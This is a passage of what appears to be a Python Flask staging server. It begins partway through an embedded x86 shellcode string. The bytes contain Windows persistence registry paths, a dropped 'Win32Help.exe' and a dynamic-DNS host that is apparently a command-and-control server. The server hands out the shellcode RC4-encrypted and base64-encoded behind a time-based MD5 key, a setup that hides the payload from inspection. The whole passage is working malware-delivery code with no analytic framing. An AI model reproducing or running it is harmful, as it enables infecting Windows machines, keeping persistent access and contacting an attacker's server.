6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x8D\x85\x93\xF4\xFF\xFF\x50\x53\xFF\x95\xB1\xF0\xFF\xFF\xE9\x2A\x01\x00\x00\xE8\x08\x00\x00\x00\x61\x64\x76\x70\x61\x63\x6B\x00\xFF\x95\x21\xF1\xFF\xFF\x68\x6B\x37\x04\x7E\x50\x6A\x00\xE8\x5E\xF5\xFF\xFF\x6A\x00\x6A\x00\xFF\xD0\x88\x85\x33\xF9\xFF\xFF\x68\x0E\x03\xE5\xE6\xFF\xB5\x5F\xFB\xFF\xFF\x6A\x00\xE8\x40\xF5\xFF\xFF\x0B\xC0\x75\x12\x68\x94\x2C\xD5\x87\xFF\xB5\x3F\xFB\xFF\xFF\x6A\x00\xE8\x2A\xF5\xFF\xFF\x89\x85\x0D\xF1\xFF\xFF\x8D\x85\x7F\xF4\xFF\xFF\x50\x6A\x00\x6A\x00\xFF\x95\x09\xF1\xFF\xFF\x89\x45\xFC\xFF\x95\x0D\xF1\xFF\xFF\x3D\xB7\x00\x00\x00\x0F\x84\xAB\x00\x00\x00\xFF\x75\xFC\xFF\x95\x25\xF1\xFF\xFF\x80\xBD\x8C\xFD\xFF\xFF\x01\x74\x7D\x8D\xB5\x84\xF0\xFF\xFF\xE8\x00\x00\x00\x00\x5F\x81\xEF\x57\x11\x00\x00\xE8\x34\x00\x00\x00\xD9\x00\x51\x05\xE9\x00\x4B\x00\xE5\x00\x9D\x00\xDD\x00\xEA\x00\xFD\x00\x9A\x01\x01\x01\xEC\x00\x05\x01\xEF\x00\x09\x01\x66\x00\x0D\x01\x6B\x00\x11\x01\x00\x01\x15\x01\x1E\x00\x19\x01\x1E\x00\x1D\x01\x00\x00\x59\x0F\xB7\x11\x89\x3C\x32\x66\x83\x79\x02\x00\x74\x0B\x0F\xB7\x51\x02\x03\xFA\x83\xC1\x04\xEB\xE8\x83\xBD\x59\xF1\xFF\xFF\x00\x74\x07\x56\xFF\x95\x59\xF1\xFF\xFF\x56\xFF\x95\x5D\xF1\xFF\xFF\xEB\x1C\xE8\x00\x00\x00\x00\x58\x2D\xCE\x11\x00\x00\xFF\x75\xF8\x50\x8D\x85\x84\xF0\xFF\xFF\x50\xFF\x95\x88\xFD\xFF\xFF\x61\xC9\xC3\x0F\x04\x08\x00\x53\x74\x75\x62\x50\x61\x74\x68\x18\x04\x28\x00\x53\x4F\x46\x54\x57\x41\x52\x45\x5C\x43\x6C\x61\x73\x73\x65\x73\x5C\x68\x74\x74\x70\x5C\x73\x68\x65\x6C\x6C\x5C\x6F\x70\x65\x6E\x5C\x63\x6F\x6D\x6D\x61\x6E\x64\x56\x04\x35\x00\x53\x6F\x66\x74\x77\x61\x72\x65\x5C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x5C\x41\x63\x74\x69\x76\x65\x20\x53\x65\x74\x75\x70\x5C\x49\x6E\x73\x74\x61\x6C\x6C\x65\x64\x20\x43\x6F\x6D\x70\x6F\x6E\x65\x6E\x74\x73\x5C\xFA\x0A\x05\x00\x65\x64\x75\x74\x77\xF9\x0B\x03\x00\x65\x64\x75\x90\x01\x1A\x00\x16\x61\x73\x75\x66\x68\x63\x6E\x66\x75\x66\x6B\x64\x2E\x66\x33\x33\x32\x32\x2E\x6E\x65\x74\x00\x84\x0D\x8C\x01\x04\x00\x00\x00\x00\x00\xC1\x02\x04\x00\xFF\xFF\xFF\xFF\x45\x01\x07\x00\x62\x61\x6B\x61\x62\x69\x65\x09\x0D\x01\x00\x01\x12\x0E\x09\x00\x57\x69\x6E\x33\x32\x48\x65\x6C\x70\xFB\x03\x09\x00\x29\x21\x56\x6F\x71\x41\x2E\x49\x34\x2D\x01\x0D\x00\x57\x69\x6E\x33\x32\x48\x65\x6C\x70\x2E\x65\x78\x65\xF7\x03\x01\x00\x01\x00\x00\x0A\x0D\xA1\x00\x55\x8B\xEC\x83\xC4\xFC\x8B\x75\x08\x68\xFF\x00\x00\x00\x8D\xBE\x13\x0D\x00\x00\x57\xFF\x96\xAD\x00\x00\x00\xE8\x2E\x00\x00\x00\x53\x4F\x46\x54\x57\x41\x52\x45\x5C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x43\x75\x72\x72\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x5C\x52\x75\x6E\x00\x57\xFF\x96\x81\x00\x00\x00\x80\xBE\xAF\x08\x00\x00\x01\x75\x07\xB9\x02\x00\x00\x80\xEB\x05\xB9\x01\x00\x00\x80\x8D\x45\xFC\x50\x68\x3F\x00\x0F\x00\x6A\x00\x57\x51\xFF\x56\x35\x68\xFF\x00\x00\x00\x8D\x86\xB1\x06\x00\x00\x50\x6A\x01\x6A\x00\x8D\x86\x12\x0E\x00\x00\x50\xFF\x75\xFC\xFF\x56\x3D\xFF\x75\xFC\xFF\x56\x31\xC9\xC2\x04\x00\xD5\x00\xC5\x00\x55\x8B\xEC\x8B\x75\x08\x80\xBE\xF7\x03\x00\x00\x00\x7E\x07\x56\xFF\x96\x00\x0D\x00\x00\x80\xBE\xF8\x03\x00\x00\x01\x75\x30\xB8\x01\x00\x00\x00\x80\xBE\xF7\x03\x00\x00\x00\x7E\x14\x8D\xBE\xB1\x06\x00\x00\x57\x8D\xBE\xB2\x05\x00\x00\x57\xFF\x96\xCD\x00\x00\x00\x0B\xC0\x74\x0A\x8D\xBE\xB2\x05\x00\x00\x57\xFF\x56\x51\x80\xBE\xF6\x03\x00\x00\x01\x75\x09\x6A\x00\x56\xFF\x96\xF5\x00\x00\x00\x80\xBE\x09\x0D\x00\x00\x01\x75\x07\x56\xFF\x96\x0A\x0D\x00\x00\x80\xBE\xFA\x03\x00\x00\x01\x75\x17\x8D\x86\xBD\x08\x00\x00\x50\x6A\x00\x56\xFF\xB6\x0E\x0D\x00\x00\x6A\x00\x6A\x00\xFF\x56\x29\x80\xBE\x08\x0D\x00\x00\x01\x75\x27\x80\xBE\xF9\x03\x00\x00\x01\x75\x17\x8D\x86\xC1\x08\x00\x00\x50\x6A\x00\x56\xFF\xB6\xF9\x00\x00\x00\x6A\x00\x6A\x00\xFF\x56\x29\x56\xFF\x96\xF1\x00\x00\x00\xC9\xC2\x04\x00\x00\x0D\x0A\x02\x55\x8B\xEC\x83\xC4\xF0\x8B\x75\x08\x8D\xBE\xB1\x06\x00\x00\x68\xFF\x00\x00\x00\x57\xFF\x96\xAD\x00\x00\x00\x80\xBE\xAF\x08\x00\x00\x01\x75\x31\x80\xBE\xF7\x03\x00\x00\x01\x75\x07\x68\x74\x82\x24\xFE\xEB\x05\x68\xCE\xE7\x3A\x59\xFF\xB6\xBB\x0A\x00\x00\xFF\xB6\xE1\x00\x00\x00\xFF\x96\xDD\x00\x00\x00\x68\xFF\x00\x00\x00\x57\xFF\xD0\xEB\x7F\x8D\x45\xF8\x50\x6A\x01\x6A\x00\xE8\x41\x00\x00\x00\x53\x4F\x46\x54\x57\x41\x52\x45\x5C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x43\x75\x72\x72\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x5C\x45\x78\x70\x6C\x6F\x72\x65\x72\x5C\x53\x68\x65\x6C\x6C\x20\x46\x6F\x6C\x64\x65\x72\x73\x00\x68\x01\x00\x00\x80\xFF\x56\x35\xC7\x45\xFC\x04\x01\x00\x00\x8D\x45\xFC\x50\x57\x6A\x00\x6A\x00\xE8\x08\x00\x00\x00\x41\x70\x70\x44\x61\x74\x61\x00\xFF\x75\xF8\xFF\x56\x39\xFF\x75\xF8\xFF\x56\x31\x83\xC7\x01\x80\x3F\x00\x75\xF8\x80\x7F\xFF\x5C\x75\x03\x83\xEF\x01\x80\xBE\x12\x0D\x00\x00\x01\x75\x07\x66\xC7\x07\x3A\x00\xEB\x05\x66\xC7\x07\x5C\x00\x33\xC0\x89\x45\xFC\x57\x8D\x8E\x2D\x01\x00\x00\x51\x8D\xBE\xB1\x06\x00\x00\x57\xFF\x96\x81\x00\x00\x00\x57\x8D\x86\xB2\x05\x00\x00\x50\xFF\x96\xCD\x00\x00\x00\x0B\xC0\x75\x06\x5F\xE9\xDA\x00\x00\x00\xC7\x45\xF4\x00\x00\x00\x00\x57\x6A\x00\x68\x80\x00\x00\x00\x6A\x03\x6A\x00\x6A\x01\x68\x00\x00\x00\x80\x8D\x8E\xB2\x05\x00\x00\x51\xFF\x56\x59\x83\xF8\xFF\x74\x6F\x97\x6A\x00\x57\xFF\x96\xF8\x0C\x00\x00\x89\x45\xF0\x6A\x40\x68\x00\x10\x00\x00\x50\x6A\x00\xFF\x56\x21\x89\x45\xF4\x6A\x00\x8D\x4D\xF8\x51\xFF\x75\xF0\x50\x57\xFF\x96\xFC\x0C\x00\x00\x57\xFF\x96\xA1\x00\x00\x00\x5F\x57\xFF\x56\x51\x6A\x00\x68\x80\x00\x00\x00\x6A\x01\x6A\x00\x6A\x02\x68\x00\x00\x00\x40\x57\xFF\x56\x59\x83\xF8\xFF\x74\x1A\x97\x6A\x00\x8D\x45\xF8\x50\xFF\x75\xF0\xFF\x75\xF4\x57\xFF\x56\x69\x57\xFF\x96\xA1\x00\x00\x00\x33\xC0\x50\x83\x7D\xF4\x00\x74\x0D\x68\x00\x80\x00\x00\x6A\x00\xFF\x75\xF4\xFF\x56\x25\x58\x5F\x85\xC0\x74\x28\x80\xBE\xAF\x08\x00\x00\x01\x74\x06\x83\x7D\xFC\x01\x74\x19\x66\xC7\x07\x5C\x00\x68\xF4\x01\x00\x00\xFF\x96\xA5\x00\x00\x00\x83\x45\xFC\x01\xE9\xF9\xFE\xFF\xFF\xC9\xC2\x04\x00\x00\x00\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x56\x08\x8B\x7E\x20\x8B\x36\x83\x7F\x18\x00\x75\xF2\x89\x95\x3F\xFB\xFF\xFF\xC3"
buf2 = "test"
obs = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd"
keys = [int(time.time()),''.join(random.sample(string.ascii_letters + string.digits, 32))]
@app.route('/<key>')
def Center(key):

    t = time.time()
    t = int(int(t) / 100)
    hl = hashlib.md5()
    hl.update((obs+str(t)).encode(encoding='utf-8'))
    md5 = hl.hexdigest()
    if key ==md5:
        global keys
        print(int(time.time()),keys[0])
        if int(time.time())-keys[0] >= 10:
            salt = ''.join(random.sample(string.ascii_letters + string.digits, 32))
            print(salt)
            keys[1] = salt
            keys[0]=int(time.time())
        print(keys)
        return keys[1]
    elif key==str(int(int(time.time()) / 100))+".jpg":

        arc4 = ARC4(keys[1])
        enc = arc4.encrypt(buf)
        b64 =  base64.b64encode(enc)
        arc3 = ARC4(keys[1])
        dec = arc3.decrypt(enc)
        return b64.decode()
    return "nothing"
@app.route("/my/get_size")
def size():
    return str(len(buf))
#encrypted = encrypt(buf, key)
if __name__ == '__main__':
    app.run(host="0.0.0.0",port=82)